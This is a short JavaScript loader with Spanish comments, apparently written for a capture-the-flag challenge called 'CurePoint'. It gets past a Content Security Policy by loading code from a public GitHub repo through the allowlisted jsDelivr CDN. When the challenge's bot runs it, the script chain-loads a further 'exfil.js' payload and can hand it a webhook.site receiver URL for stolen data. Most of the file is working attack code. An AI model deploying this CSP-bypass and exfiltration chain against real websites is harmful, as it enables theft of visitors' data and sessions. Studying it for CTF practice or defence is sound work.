/**
 * CurePoint / CSP: primer script permitido (jsDelivr = GitHub publico).
 * "Ping" al bot: carga en cadena exfil.js desde el mismo repo vía jsDelivr.
 * Opcional: data-wh="https://webhook.site/TU-UUID" para pasar la URL del receptor.
 */
(function () {
  var cur = document.currentScript;
  var src = cur && cur.src ? cur.src : "";
  var base = src.slice(0, src.lastIndexOf("/") + 1);
  var wh = (cur && cur.getAttribute("data-wh")) || "";
  wh = wh.trim();
  if (wh) {
    try {
      window.__CTF_WEBHOOK__ = wh;
    } catch (e) {}
  }
  var s = document.createElement("script");
  s.src = base + "exfil.js";
  (document.head || document.documentElement).appendChild(s);
})();
